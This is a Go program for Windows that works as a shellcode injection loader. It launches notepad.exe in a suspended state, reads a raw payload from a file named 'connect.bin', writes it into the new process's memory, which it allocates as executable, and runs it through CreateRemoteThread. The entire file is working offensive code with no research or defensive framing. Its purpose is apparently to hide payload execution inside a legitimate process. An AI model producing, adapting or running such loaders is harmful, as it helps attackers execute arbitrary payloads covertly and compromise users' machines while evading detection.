package main

import(
	"fmt"
	"syscall"
	"unsafe"
	"golang.org/x/sys/windows"
	"os"
)


var(
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	virtualAllocEx = kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread = kernel32.NewProc("CreateRemoteThread")
)


func main(){
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	err := windows.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr("C:\\Windows\\notepad.exe"),
		nil, nil, false,
		windows.CREATE_SUSPENDED,
		nil, nil, &si, &pi,
	)
	if err != nil {
		fmt.Println("Error creating process:", err)
		return
	}

	shellcode, err := os.ReadFile("connect.bin")
	if err != nil {
		fmt.Println("Error reading shellcode:", err)
		return
	}

	// Allocate memory in the target process
	addr, _, err := virtualAllocEx.Call(
		uintptr(pi.Process), 0, uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		fmt.Println("Error allocating memory in target process:", err)
		return
	}

	// Write the shellcode to the allocated memory
	ret, _, err := writeProcessMemory.Call(
		uintptr(pi.Process), addr,
		uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
		0,
	)
	if ret == 0 {
		fmt.Println("Error writing to process memory:", err)
		return
	}

	// Create a remote thread to execute the shellcode
	ret, _, err = createRemoteThread.Call(
		uintptr(pi.Process), 0, 0, addr, 0, 0, 0,
	)
	if ret == 0 {
		fmt.Println("Error creating remote thread:", err)
		return
	}

	//windows.ResumeThread(pi.Thread)
	fmt.Println("Shellcode executed successfully")
}

